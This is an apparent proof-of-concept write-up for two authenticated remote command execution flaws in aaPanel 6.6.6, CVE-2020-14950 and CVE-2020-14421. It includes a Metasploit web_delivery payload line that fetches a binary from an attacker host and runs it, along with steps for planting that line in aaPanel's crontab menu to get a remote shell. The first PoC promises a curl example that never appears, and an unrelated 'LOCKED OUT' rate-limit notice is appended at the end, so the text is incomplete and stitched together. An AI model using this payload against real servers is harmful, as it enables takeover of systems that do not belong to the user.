## aapanel 6.6.6 - CVE-2020-14950

* Description : allows remote authenticated users to execute arbitrary commands via the setting menu of Sotfware Store.
* Affected version : All <= 6.6.6

### Information

To make this PoC, I just installed the software using docker-compose

* Vulnerability Type : Remote command execution (Authenticated RCE)

### POC

Go to Software Store, click on any row from the setting's field, intercept the request when you click on "start/stop/restart" and modify/edit the resquest to execute what you want. Here is an example with curl :

## aapanel 6.6.6 - CVE-2020-14421

* Description : Allows attacker to run arbitrary command remotely
* Affected version : All <= 6.6.6

### Information

To make this PoC, I just installed fresh Ubuntu 20.04, then I installed `wget` + `sudo` and executed this script `wget -O install.sh http://www.aapanel.com/script/install-ubuntu_6.0_en.sh && sudo bash install.sh`

* Vulnerability Type : Remote command execution (RCE Authenticated)

### POC

First of all, setup web\_delivery options, this will create a payload and a listener.

[![web_delivery](https://raw.githubusercontent.com/jenaye/aapanel/master/web_delivery.png)](https://raw.githubusercontent.com/jenaye/aapanel/master/web_delivery.png)

Now run it

[![run](https://raw.githubusercontent.com/jenaye/aapanel/master/run.png)](https://raw.githubusercontent.com/jenaye/aapanel/master/run.png)

this will generate the following payload:

`wget -qO wt8v00sC --no-check-certificate http://xxxx:8088/gUVn1orp; chmod +x wt8v00sC; ./wt8v00sC& disown`

Then copy/past like this into `script content` of crontab menu in aapanel.

[![cron](https://raw.githubusercontent.com/jenaye/aapanel/master/cron.png)](https://raw.githubusercontent.com/jenaye/aapanel/master/cron.png)

Now just execute your crontab and wait your session.

[![command](https://raw.githubusercontent.com/jenaye/aapanel/master/command.png)](https://raw.githubusercontent.com/jenaye/aapanel/master/command.png)

### Fast Exploit

Just run `msfconsole -r aapanel.rc` copy/paste the payload into script content section, and enjoy your session.

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
